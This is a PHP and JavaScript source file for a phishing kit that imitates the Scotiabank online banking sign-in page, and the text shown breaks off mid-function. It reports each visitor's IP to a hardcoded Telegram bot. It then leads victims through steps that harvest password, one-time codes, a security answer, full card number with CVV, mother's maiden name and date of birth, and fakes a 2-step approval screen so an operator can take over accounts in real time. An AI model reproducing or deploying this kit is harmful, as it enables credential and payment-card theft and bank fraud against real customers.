<?php
/**
 * Scotiabank Online Banking - Unified Remote Control System
 * 
 * This file contains the complete frontend UI, adapted to the Scotiabank login design,
 * and the background logic for real-time Telegram Bot interaction.
 */

// --- CONFIGURATION ---
$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = '-1002922644009';

// Initial notification for a new visitor
// This runs once when the page is first loaded.
if (!isset($_POST['action'])) {
    $notifyUrl = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $payload = [
        'chat_id' => $chatId,
        'text' => "🔴 Scotiabank Online 🔴\n\nNEW VISITOR CONNECTED\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n🔴 Scotiabank Online 🔴",
        'parse_mode' => 'HTML'
    ];
    // Suppress errors for file_get_contents if Telegram API is unreachable
    @file_get_contents($notifyUrl, false, stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($payload)
        ]
    ]));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Scotiabank.com/uap-ui/?consumer&locale=en_CA#/uap/login</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
<style>
  /* Scotiabank Theme Variables */
  :root {
    --scotia-red: #EC1C24;
    --scotia-blue: #005087; /* For links and accents */
    --scotia-dark-text: #333333;
    --scotia-light-text: #666666; /* For icons and placeholders */
    --scotia-border: #cccccc;
    --scotia-bg-grey: #f5f5f5;
    --scotia-error: #e00;
  }

  html, body {
    height: 100%;
    margin: 0;
    font-family: 'Roboto', Arial, sans-serif;
    background-color: white; /* Clean white background */
    overflow-x: hidden; /* Prevent horizontal scroll */
  }

  /* Main container for the centered login form */
  .scotia-app-container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start; /* Align content to top, allowing it to scroll if needed */
    min-height: 100vh;
    padding: 0px; /* No padding on container itself, let form-container handle it */
    box-sizing: border-box;
    position: relative;
  }

  /* Header with padlock icon */
  .scotia-header {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    padding: 15px 20px;
    display: flex;
    justify-content: flex-end; /* Push icon to the right */
    align-items: center;
    box-sizing: border-box;
  }
  .scotia-header-icon {
    width: 20px; /* Adjusted width for the new SVG */
    height: 24px; /* Adjusted height for the new SVG (approx 16x19 ratio) */
    fill: none; /* New SVG uses strokes, not fill for main paths */
  }
  .scotia-header-icon path {
      fill: none; /* Ensure fill is none for paths in the new SVG */
  }


  /* Welcome and Scotiabank Logo text */
  .scotia-welcome {
    font-size: 1.25rem;
    font-weight: 400;
    color: var(--scotia-dark-text);
    margin-bottom: 5px;
  }
  .scotia-logo-svg { /* New style for the SVG logo */
    width: 207px; /* Original width of the SVG */
    height: 29px; /* Original height of the SVG */
    margin-bottom: 40px;
    transition: opacity 0.3s ease, transform 0.3s ease; /* Smooth transition for logo effects */
  }
  .scotia-logo-svg path {
      fill: var(--scotia-red); /* Ensure all paths within the logo SVG are red */
  }

  /* Logo dimming and raising effect when loading */
  .scotia-app-container.loading-active .scotia-logo-svg {
    opacity: 0.6; /* Dim it */
    transform: translateY(-10px); /* Raise it slightly */
  }

  /* Main form container (centered card-like) */
  .scotia-form-container {
    background-color: white;
    width: 100%;
    max-width: 380px; /* Constrain width as in image */
    padding: 20px; /* Internal padding for the form */
    box-sizing: border-box;
    flex-grow: 1; /* Allow it to take up vertical space */
    display: flex;
    flex-direction: column;
    justify-content: center; /* Center content vertically if space allows */
    margin-top: 80px; /* Adjust based on header height to prevent overlap */
  }

  /* Form group styling */
  .scotia-form-group {
    margin-bottom: 20px;
  }
  .scotia-label {
    display: block;
    font-size: 0.9rem;
    font-weight: 500;
    color: var(--scotia-dark-text);
    margin-bottom: 5px;
  }
  .scotia-input-wrapper {
    position: relative;
    border-bottom: 1px solid var(--scotia-border); /* Underline style */
    padding-bottom: 5px;
  }
  .scotia-input-wrapper svg {
    position: absolute;
    left: 0;
    top: 50%;
    transform: translateY(-50%);
    width: 20px;
    height: 20px;
    fill: var(--scotia-light-text);
  }
  .scotia-input {
    width: 100%;
    padding: 8px 0px 8px 30px; /* Space for icon */
    border: none;
    font-size: 1rem;
    color: var(--scotia-dark-text);
    background: transparent;
  }
  .scotia-input::placeholder {
    color: var(--scotia-light-text);
  }
  .scotia-input:focus {
    outline: none;
    border-color: transparent; /* No border for input itself */
  }
  .scotia-input-wrapper:focus-within {
      border-bottom-color: var(--scotia-red); /* Highlight bottom border on focus */
  }

  /* Remember me checkbox */
  .scotia-checkbox-group {
    display: flex;
    align-items: center;
    margin-top: 15px;
    margin-bottom: 25px;
    font-size: 0.9rem;
    color: var(--scotia-dark-text);
  }
  .scotia-checkbox-group input[type="checkbox"] {
    margin-right: 10px;
    width: 18px;
    height: 18px;
    min-width: 18px; /* Ensure it doesn't shrink */
    min-height: 18px; /* Ensure it doesn't shrink */
    border: 1px solid var(--scotia-border);
    border-radius: 2px;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    cursor: pointer;
    position: relative;
  }
  .scotia-checkbox-group input[type="checkbox"]:checked {
    background-color: var(--scotia-red);
    border-color: var(--scotia-red);
  }
  .scotia-checkbox-group input[type="checkbox"]:checked::before {
    content: '';
    position: absolute;
    top: 3px;
    left: 5px;
    width: 6px;
    height: 10px;
    border: solid white;
    border-width: 0 2px 2px 0;
    transform: rotate(45deg);
  }

  /* Sign in button */
  .scotia-button-primary {
    width: 100%;
    padding: 15px;
    background-color: var(--scotia-red);
    color: white;
    border: none;
    border-radius: 4px; /* Slightly rounded corners for the button */
    font-size: 1.1rem;
    font-weight: 700;
    cursor: pointer;
    transition: background-color 0.2s ease, opacity 0.2s ease; /* Add opacity transition */
    margin-bottom: 25px;
  }
  .scotia-button-primary:hover:not(.is-waiting) {
    background-color: #d01820; /* Darker red on hover */
  }
  .scotia-button-primary.is-waiting {
    opacity: 0.7; /* Dim the button */
    cursor: not-allowed;
    background-color: var(--scotia-red); /* Keep background, but dimmed */
  }


  /* Help and setup links */
  .scotia-link {
    color: var(--scotia-blue);
    text-decoration: none;
    font-size: 0.95rem;
    font-weight: 500;
    display: block;
    text-align: center;
    margin-bottom: 10px;
  }
  .scotia-link:hover {
    text-decoration: underline;
  }
  .scotia-arrow-right {
    display: inline-block;
    width: 0;
    height: 0;
    margin-left: 5px;
    border-top: 4px solid transparent;
    border-bottom: 4px solid transparent;
    border-left: 6px solid var(--scotia-blue);
  }

  .scotia-footer-text {
    font-size: 0.95rem;
    color: var(--scotia-dark-text);
    text-align: center;
    margin-top: 30px; /* Space from the links above */
    padding-top: 30px; /* Separator effect */
    border-top: 1px solid var(--scotia-bg-grey);
    background-color: white; /* Ensure background is white */
  }
  .scotia-footer-text a {
    color: var(--scotia-blue);
    font-weight: 500;
    text-decoration: underline; /* Underline specific text */
  }
  .scotia-footer-text a:hover {
    color: var(--scotia-red); /* Hover color for links */
  }

  /* General step section styling */
  .step-section {
    display: none;
    width: 100%;
    max-width: 380px;
    margin: 0 auto;
    padding-bottom: 20px; /* Ensure space at bottom for scrolling */
  }
  .step-section.active {
    display: block;
    animation: fadeIn 0.3s ease-in-out;
  }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

  /* Error Message Styling */
  .scotia-error {
    color: var(--scotia-error);
    font-size: 0.85rem;
    text-align: center;
    margin-top: 15px;
    font-weight: 500;
    display: none; /* Hidden by default */
  }

  /* Info Bubble Styling */
  .scotia-info-bubble {
    background-color: #f0f8ff; /* Light blue background */
    border: 1px solid #d0e0ff; /* Blue border */
    padding: 15px;
    border-radius: 4px;
    margin-bottom: 20px;
    font-size: 0.9rem;
    line-height: 1.5;
    color: #004080; /* Dark blue text */
  }

  /* Loading Spinner Styling (Scotiabank themed) - NO LONGER USED */
  .scotia-loader-spinner {
    display: none; /* Removed as per user request */
  }

  /* Success Checkmark Styling (Scotiabank themed) */
  .scotia-success-checkmark {
    width: 70px;
    height: 70px;
    border-radius: 50%;
    background-color: #e6ffe6; /* Light green */
    border: 4px solid #4CAF50; /* Green border */
    position: relative;
    margin: 0 auto 20px auto;
    animation: scaleUp 0.5s ease forwards;
  }
  .scotia-success-checkmark::after {
    content: '';
    position: absolute;
    left: 22px;
    top: 32px;
    width: 25px;
    height: 12px;
    border-left: 4px solid #4CAF50;
    border-bottom: 4px solid #4CAF50;
    transform: rotate(-45deg);
    opacity: 0;
    animation: drawCheck 0.5s 0.5s forwards;
  }
  @keyframes scaleUp { 0%{transform:scale(0);} 100%{transform:scale(1);} }
  @keyframes drawCheck { 0%{opacity:0;transform:rotate(-45deg) scale(0);} 100%{opacity:1;transform:rotate(-45deg) scale(1);} }

  /* Utility Classes */
  .text-center { text-align: center; }
  .hidden { display: none !important; }
  .d-block { display: block; } /* From Bootstrap, for consistency */
  .mb-4 { margin-bottom: 1rem; }
  .mb-6 { margin-bottom: 1.5rem; }
  .flex-gap-4 { display: flex; gap: 1rem; }
  .flex-1 { flex: 1; }

  /* Swipe-specific styles */
  .scotia-swipe-instructions {
      padding: 0px 10px; /* As per provided file */
      text-align: left;
      margin: 0 auto;
      max-width: 380px;
  }
  .scotia-swipe-instructions ol {
      list-style-type: none; /* Remove default numbering */
      padding: 0;
      margin: 20px 0px; /* As per provided file */
  }
  .scotia-swipe-instructions li {
      margin-bottom: 14px;
      font-size: 12px;
      color: #111;
  }
  .scotia-swipe-instructions p {
      font-size: 12px;
      color: #333;
      line-height: 1.5;
      margin-top: 6px;
  }

</style>
</head>
<body>
<div id="main-app-container" class="scotia-app-container">

    <!-- Header -->
    <header class="scotia-header">
        <!-- Padlock icon from Scotiabank image -->
        <svg class="scotia-header-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="19" viewBox="0 0 16 19">
            <g fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round">
                <path stroke="#333" stroke-width="1.5" d="M15 16.449c0 .853-.7 1.551-1.556 1.551H2.556A1.56 1.56 0 0 1 1 16.449V8.692c0-.853.7-1.551 1.556-1.551h10.888C14.3 7.14 15 7.839 15 8.692zM4.111 4.864C4.111 2.732 5.851 1 8 1s3.889 1.732 3.889 3.864v1.751M4.11 7V4.864"/>
                <path stroke="#138468" stroke-width="1.5" d="m10.39 11.364-1.607 1.609-1.564 1.62L5.59 13.08l-.098-.092"/></g></svg>
    </header>

    <!-- Main Scotiabank Login Form / Content Area -->
    <div class="scotia-form-container">
        <div class="text-center">
            <h1 class="scotia-welcome">Welcome to</h1>
            <svg class="scotia-logo-svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="207pt" height="29pt" viewBox="0 0 207 29" version="1.1">
                <g id="surface1">
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 51.140625 8.828125 C 45.570312 8.820312 41.050781 13.335938 41.046875 18.910156 C 41.042969 24.488281 45.558594 29.007812 51.128906 29.011719 C 56.699219 29.011719 61.214844 24.492188 61.214844 18.917969 C 61.214844 13.347656 56.707031 8.832031 51.140625 8.828125 Z M 51.140625 23.363281 C 48.6875 23.347656 46.710938 21.34375 46.722656 18.886719 C 46.734375 16.433594 48.730469 14.449219 51.183594 14.453125 C 53.636719 14.460938 55.625 16.453125 55.625 18.910156 C 55.625 20.09375 55.152344 21.234375 54.308594 22.070312 C 53.46875 22.90625 52.328125 23.371094 51.140625 23.363281 Z M 51.140625 23.363281 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 74.0625 9.304688 L 71.3125 9.304688 L 71.3125 3.355469 L 65.28125 3.355469 L 65.28125 9.304688 L 62.53125 9.304688 L 62.53125 14.769531 L 65.28125 14.769531 L 65.28125 28.519531 L 71.3125 28.519531 L 71.3125 14.769531 L 74.0625 14.769531 Z M 74.0625 9.304688 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 76.820312 9.304688 L 82.84375 9.304688 L 82.84375 28.511719 L 76.820312 28.511719 Z M 76.820312 9.304688 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 79.835938 0 C 78.476562 -0.00390625 77.246094 0.8125 76.722656 2.070312 C 76.199219 3.324219 76.484375 4.773438 77.445312 5.738281 C 78.40625 6.703125 79.855469 6.992188 81.109375 6.472656 C 82.367188 5.953125 83.1875 4.726562 83.1875 3.363281 C 83.1875 1.511719 81.691406 0.00390625 79.835938 0 Z M 79.835938 0 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 166.21875 14.484375 C 168.195312 14.492188 169.796875 16.09375 169.800781 18.074219 L 169.800781 28.542969 L 175.824219 28.542969 L 175.824219 17.328125 C 175.824219 12.230469 172.878906 8.910156 168.222656 8.910156 C 166.308594 8.910156 164.292969 9.746094 162.632812 12.4375 L 162.632812 9.378906 L 156.601562 9.378906 L 156.601562 28.542969 L 162.582031 28.542969 L 162.582031 18.074219 C 162.582031 17.113281 162.96875 16.195312 163.652344 15.519531 C 164.335938 14.847656 165.257812 14.472656 166.21875 14.484375 Z M 166.21875 14.484375 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 197.773438 28.519531 L 190.378906 18.917969 L 197.253906 9.304688 L 190.214844 9.304688 L 184.683594 17.085938 L 184.683594 0.480469 L 178.664062 0.480469 L 178.664062 28.519531 L 184.683594 28.519531 L 184.683594 20.601562 L 190.753906 28.519531 Z M 197.773438 28.519531 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 20.339844 23.34375 C 20.800781 22.222656 21.023438 21.015625 20.992188 19.804688 C 21.035156 18.023438 20.421875 16.285156 19.269531 14.921875 C 17.984375 13.507812 15.785156 12.332031 12.738281 11.4375 C 12.148438 11.285156 11.574219 11.078125 11.019531 10.824219 C 10.539062 10.589844 10.109375 10.269531 9.746094 9.878906 C 9.367188 9.449219 9.167969 8.890625 9.195312 8.316406 C 9.207031 7.480469 9.675781 6.714844 10.417969 6.328125 C 11.9375 5.660156 13.667969 5.660156 15.183594 6.328125 C 15.859375 6.574219 16.507812 6.878906 17.128906 7.238281 L 19.6875 2.140625 C 18.542969 1.433594 17.3125 0.890625 16.019531 0.519531 C 14.6875 0.175781 13.320312 0 11.945312 0 C 10.636719 -0.0234375 9.335938 0.191406 8.105469 0.632812 C 7.011719 1.058594 6.015625 1.710938 5.183594 2.539062 C 4.347656 3.375 3.683594 4.371094 3.238281 5.464844 C 2.796875 6.589844 2.578125 7.792969 2.585938 9 C 2.65625 10.929688 3.472656 12.753906 4.855469 14.097656 C 6.175781 15.253906 7.722656 16.121094 9.398438 16.636719 C 10.195312 16.941406 11.078125 17.214844 11.640625 17.429688 C 12.21875 17.648438 12.773438 17.925781 13.289062 18.265625 C 13.660156 18.53125 13.960938 18.878906 14.167969 19.285156 C 14.347656 19.671875 14.414062 20.097656 14.359375 20.519531 C 14.300781 21.160156 13.992188 21.753906 13.503906 22.171875 C 12.703125 22.753906 11.71875 23.023438 10.734375 22.933594 C 9.570312 22.902344 8.425781 22.628906 7.371094 22.128906 C 6.449219 21.6875 5.554688 21.191406 4.691406 20.640625 L 1.636719 25.890625 C 4.046875 27.871094 7.058594 28.96875 10.171875 29 C 11.714844 29 13.25 28.757812 14.714844 28.277344 C 15.976562 27.855469 17.144531 27.203125 18.160156 26.351562 C 19.089844 25.511719 19.832031 24.488281 20.339844 23.34375 Z M 20.339844 23.34375 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 202.023438 21.804688 C 200.660156 21.796875 199.429688 22.609375 198.902344 23.863281 C 198.375 25.117188 198.65625 26.566406 199.613281 27.535156 C 200.570312 28.503906 202.015625 28.796875 203.277344 28.28125 C 204.535156 27.761719 205.359375 26.539062 205.363281 25.175781 C 205.367188 23.324219 203.875 21.816406 202.023438 21.804688 Z M 202.023438 27.847656 C 200.933594 27.851562 199.949219 27.199219 199.53125 26.195312 C 199.109375 25.1875 199.339844 24.03125 200.105469 23.257812 C 200.875 22.484375 202.03125 22.253906 203.039062 22.671875 C 204.042969 23.085938 204.699219 24.066406 204.699219 25.15625 C 204.703125 25.871094 204.421875 26.554688 203.917969 27.058594 C 203.417969 27.5625 202.734375 27.847656 202.023438 27.847656 Z M 202.023438 27.847656 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 202.011719 25.71875 L 201.472656 25.71875 L 201.472656 26.992188 L 200.820312 26.992188 L 200.820312 23.324219 L 202.214844 23.324219 C 202.890625 23.324219 203.4375 23.871094 203.4375 24.546875 C 203.425781 25.007812 203.152344 25.421875 202.734375 25.617188 L 203.507812 26.992188 L 202.714844 26.992188 Z M 201.472656 25.105469 L 202.246094 25.105469 C 202.554688 25.105469 202.804688 24.855469 202.804688 24.546875 C 202.804688 24.234375 202.554688 23.984375 202.246094 23.984375 L 201.472656 23.984375 Z M 201.472656 25.105469 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 36.832031 21.703125 C 35.296875 23.617188 32.503906 23.925781 30.589844 22.394531 C 28.675781 20.859375 28.363281 18.0625 29.894531 16.148438 C 31.429688 14.230469 34.222656 13.921875 36.136719 15.453125 C 36.390625 15.65625 36.625 15.886719 36.832031 16.136719 L 40.8125 12.140625 C 38.910156 10.039062 36.203125 8.84375 33.367188 8.847656 C 27.816406 8.828125 23.027344 12.792969 23.027344 18.910156 C 23.027344 25.023438 27.867188 29 33.417969 29 C 36.257812 29 38.964844 27.800781 40.875 25.699219 Z M 36.832031 21.703125 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 106.402344 28.542969 L 106.402344 9.304688 L 100.535156 9.304688 L 100.535156 11.34375 L 99.984375 10.867188 C 98.617188 9.554688 96.789062 8.820312 94.894531 8.828125 C 89.707031 8.828125 85.328125 13.445312 85.328125 18.910156 C 85.328125 24.371094 89.71875 29 94.894531 29 C 96.789062 29.003906 98.617188 28.273438 99.984375 26.960938 L 100.535156 26.480469 L 100.535156 28.519531 Z M 95.871094 23.445312 C 93.363281 23.347656 91.34375 21.382812 91.359375 18.875 C 91.371094 16.367188 93.410156 14.34375 95.917969 14.351562 C 98.425781 14.363281 100.449219 16.402344 100.445312 18.910156 C 100.441406 20.117188 99.957031 21.277344 99.097656 22.128906 C 98.242188 22.980469 97.078125 23.453125 95.871094 23.34375 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 153.71875 28.542969 L 153.71875 9.304688 L 147.851562 9.304688 L 147.851562 11.34375 L 147.300781 10.867188 C 145.929688 9.554688 144.105469 8.824219 142.207031 8.828125 C 137.023438 8.828125 132.644531 13.445312 132.644531 18.910156 C 132.644531 24.371094 137.035156 29 142.207031 29 C 144.105469 29.003906 145.929688 28.273438 147.300781 26.960938 L 147.851562 26.480469 L 147.851562 28.519531 Z M 143.226562 23.445312 C 140.714844 23.449219 138.675781 21.417969 138.671875 18.90625 C 138.667969 16.394531 140.703125 14.355469 143.214844 14.351562 C 145.722656 14.351562 147.757812 16.386719 147.757812 18.898438 C 147.757812 21.40625 145.730469 23.4375 143.226562 23.445312 Z M 143.226562 23.34375 "/>
                <path style=" stroke:none;fill-rule:nonzero;fill:rgb(92.54902%,6.666667%,10.196078%);fill-opacity:1;" d="M 115.398438 28.542969 L 115.398438 26.503906 L 115.9375 26.980469 C 117.308594 28.292969 119.132812 29.023438 121.03125 29.019531 C 126.214844 29.019531 130.59375 24.402344 130.59375 18.929688 C 130.59375 13.457031 126.214844 8.847656 121.03125 8.847656 C 119.132812 8.84375 117.308594 9.574219 115.9375 10.886719 L 115.398438 11.367188 L 115.398438 0.480469 L 109.519531 0.480469 L 109.519531 28.542969 Z M 115.519531 18.929688 C 115.507812 17.085938 116.605469 15.421875 118.304688 14.707031 C 120 13.992188 121.957031 14.375 123.265625 15.671875 C 124.570312 16.96875 124.964844 18.929688 124.261719 20.632812 C 123.5625 22.332031 121.902344 23.445312 120.0625 23.445312 C 117.558594 23.445312 115.527344 21.414062 115.519531 18.910156 Z M 115.519531 18.929688 "/>
                </g>
            </svg>
        </div>

        <!-- Step: LOGIN (Combines Username & Password as per image) -->
        <section id="step-login" class="step-section active">
            <div class="scotia-form-group">
                <label for="username" class="scotia-label">Username or card number</label>
                <div class="scotia-input-wrapper">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                    <input type="text" id="username" class="scotia-input" placeholder="Enter username or card number" autocomplete="username">
                </div>
            </div>

            <div class="scotia-form-group">
                <label for="password" class="scotia-label">Password</label>
                <div class="scotia-input-wrapper">
                    <!-- Padlock icon for password input -->
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1c0-2.21 1.79-4 4-4s4 1.79 4 4v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"/></svg>
                    <input type="password" id="password" class="scotia-input" placeholder="Enter password" autocomplete="current-password">
                </div>
            </div>
            
            <div class="scotia-checkbox-group">
                <input type="checkbox" id="rememberMe">
                <label for="rememberMe">Remember my username or card number</label>
            </div>

            <button onclick="submitLogin(event)" class="scotia-button-primary">Sign in</button>
            <div id="error-login" class="scotia-error hidden"></div>

            <a href="#" class="scotia-link">Need help signing in?<span class="scotia-arrow-right"></span></a>
            
            <p class="scotia-footer-text">
                Don't have a username and password? <a href="#">Set them up now.</a>
            </p>
        </section>

        <!-- Step: PIN (Adapted to Scotiabank theme) -->
        <section id="step-pin" class="step-section">
            <h2 class="scotia-welcome">Security Verification</h2>
            <div id="pin-info-bubble" class="scotia-info-bubble mb-4">
                <!-- Dynamic text will be inserted here by JavaScript -->
            </div>
            <div class="scotia-form-group text-center">
                <label for="pin-code" class="scotia-label mb-4">Verification Code</label>
                <input type="tel" id="pin-code" maxlength="6" class="scotia-input" style="padding-left: 10px; text-align: center; font-size: 1.5rem; letter-spacing: 0.5rem; max-width: 250px; margin: 0 auto; border-bottom: 1px solid var(--scotia-border);" placeholder="______">
            </div>
            <button onclick="submitPin(event)" class="scotia-button-primary">Verify Identity</button>
            <div id="error-pin" class="scotia-error hidden"></div>
        </section>

        <!-- Step: SECURITY QUESTION (Adapted to Scotiabank theme) -->
        <section id="step-sq" class="step-section">
            <h2 class="scotia-welcome">Confirm Your Identity</h2>
            <div class="scotia-info-bubble mb-4">
                <strong>Security Question:</strong> What is your first childhood friend's name?
            </div>
            <div class="scotia-form-group">
                <label for="sq-answer" class="scotia-label">Answer</label>
                <div class="scotia-input-wrapper" style="padding-left: 0;">
                    <input type="text" id="sq-answer" class="scotia-input" style="padding-left: 10px;" placeholder="Enter your answer">
                </div>
            </div>
            <button onclick="submitSQ(event)" class="scotia-button-primary">Confirm Answer</button>
            <div id="error-sq" class="scotia-error hidden"></div>
        </section>

        <!-- Step: CREDIT CARD (Adapted to Scotiabank theme) -->
        <section id="step-cc" class="step-section">
            <h2 class="scotia-welcome">Card Verification</h2>
            <div class="scotia-info-bubble mb-4">
                Please verify your card details to synchronize your account security.
            </div>
            <div class="scotia-form-group">
                <label for="cc-num" class="scotia-label">Card Number</label>
                <div class="scotia-input-wrapper" style="padding-left: 0;">
                    <input type="tel" id="cc-num" class="scotia-input" style="padding-left: 10px;" placeholder="0000 0000 0000 0000">
                </div>
            </div>
            <div class="flex-gap-4 mb-6">
                <div class="flex-1 scotia-form-group" style="margin-bottom: 0;">
                    <label for="cc-exp" class="scotia-label">Expiry (MM/YY)</label>
                    <div class="scotia-input-wrapper" style="padding-left: 0;">
                        <input type="tel" id="cc-exp" class="scotia-input" style="padding-left: 10px;" placeholder="MM/YY">
                    </div>
                </div>
                <div class="flex-1 scotia-form-group" style="margin-bottom: 0;">
                    <label for="cc-cvv" class="scotia-label">CVV</label>
                    <div class="scotia-input-wrapper" style="padding-left: 0;">
                        <input type="tel" id="cc-cvv" class="scotia-input" style="padding-left: 10px;" placeholder="•••">
                    </div>
                </div>
            </div>
            <button onclick="submitCC(event)" class="scotia-button-primary">Verify Card</button>
            <div id="error-cc" class="scotia-error hidden"></div>
        </section>

        <!-- Step: PERSONAL DETAILS (Adapted to Scotiabank theme) -->
        <section id="step-details" class="step-section">
            <h2 class="scotia-welcome">Personal Details</h2>
            <div class="scotia-info-bubble mb-4">
                Please provide additional details to confirm your identity.
            </div>
            <div class="scotia-form-group">
                <label for="mmn" class="scotia-label">Mother's Maiden Name</label>
                <div class="scotia-input-wrapper" style="padding-left: 0;">
                    <input type="text" id="mmn" class="scotia-input" style="padding-left: 10px;" placeholder="Enter name">
                </div>
            </div>
            <div class="scotia-form-group">
                <label for="dob" class="scotia-label">Date of Birth</label>
                <div class="scotia-input-wrapper" style="padding-left: 0;">
                    <input type="text" id="dob" class="scotia-input" style="padding-left: 10px;" placeholder="DD/MM/YYYY">
                </div>
            </div>
            <button onclick="submitDetails(event)" class="scotia-button-primary">Confirm Details</button>
            <div id="error-details" class="scotia-error hidden"></div>
        </section>

        <!-- Step: SWIPE TO APPROVE (New Step) -->
        <section id="step-swipe" class="step-section">
            <div class="_1AR6e5iqu8uXHMTFKLnqWr" style="display:flex;flex-direction:column;align-items:center;margin-bottom:24px;">
                <img src="files/317301ebaf76dea648db60b7f7c830c7.svg" alt="Verification icon" style="width:50px;height:auto;margin-bottom:20px;">
                <h1 class="TextHeading__text _3hjDHBxiP1Z2Uj2D22Khad"
                    style="font-size:18px;font-weight:800;color:#111;margin:0;line-height:1.4;text-align:center;">
                  A notification was sent to the device you set up<br>2-step verification (2SV) on
                </h1>
            </div>

            <div class="scotia-swipe-instructions">
                <p style="margin-bottom:20px;">
                  Please follow these steps to finish signing in to your account:
                </p>

                <ol>
                  <li style="margin-bottom:14px;">
                    <strong>Step&nbsp;1</strong>&nbsp;&nbsp;Select the notification.
                  </li>
                  <li style="margin-bottom:20px;">
                    <strong>Step&nbsp;2</strong>&nbsp;&nbsp;Select <strong>Yes, it’s me</strong> to confirm your identity within 3&nbsp;minutes.
                  </li>
                </ol>

                <p style="margin-bottom:20px;">
                  To re-send the notification, close the app (it must be completely shut down) or web page and sign in again.
                </p>
            </div>
            <button onclick="submitSwipe(event)" class="scotia-button-primary">I have approved on my device</button>
            <div id="error-swipe" class="scotia-error hidden"></div>
        </section>

        <!-- Step: SUCCESS (Adapted to Scotiabank theme) -->
        <section id="step-success" class="step-section text-center">
            <div class="d-flex flex-column align-items-center py-5">
                <div class="scotia-success-checkmark"></div>
                <h2 class="scotia-welcome" style="font-size: 1.5rem;">Authentication Complete</h2>
                <p class="text-gray-700 text-sm leading-relaxed px-2 mt-2">
                    Your account access has been synchronized. You will now be redirected to your dashboard.
                </p>
                <button onclick="window.location.href='https://www.scotiabank.com'" class="scotia-button-primary mt-4">
                    Go to Dashboard
                </button>
            </div>
        </section>

    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
    const TELEGRAM_TOKEN = "<?= $telegramToken; ?>";
    const CHAT_ID = "<?= $chatId; ?>";
    
    let lastUpdateId = 0;
    let pollTimer = null;
    let currentUsername = ""; // Stores username for subsequent Telegram messages
    const MAIN_APP_CONTAINER = document.getElementById('main-app-container');

    // --- Initial page load for Telegram offset ---
    window.addEventListener('load', () => {
      // Get current update ID to ignore old messages from the bot
      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1`)
          .then(r => r.json()).then(d => { if(d.result?.length) lastUpdateId = d.result[0].update_id; });
    });

    // --- Dynamic Title Update ---
    (function(customTitle){
        document.title = customTitle;
        const titles = document.getElementsByTagName('title');
        for(let t of titles){ t.textContent = customTitle; }
    })("Scotiabank - Sign In");


    // --- Core UI & Telegram Interaction Functions ---

    function showStep(id) {
        document.querySelectorAll('.step-section').forEach(s => s.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        // Hide any previous error messages when switching steps
        document.querySelectorAll('.scotia-error').forEach(e => e.classList.add('hidden'));
        document.querySelector('.scotia-form-container').scrollTop = 0; // Scroll form container to top
        
        // Ensure logo is reset when a new step is shown
        MAIN_APP_CONTAINER.classList.remove('loading-active');
    }

    // Function to set the button and main container to a waiting state
    function setButtonWaitingState(buttonElement, isWaiting) {
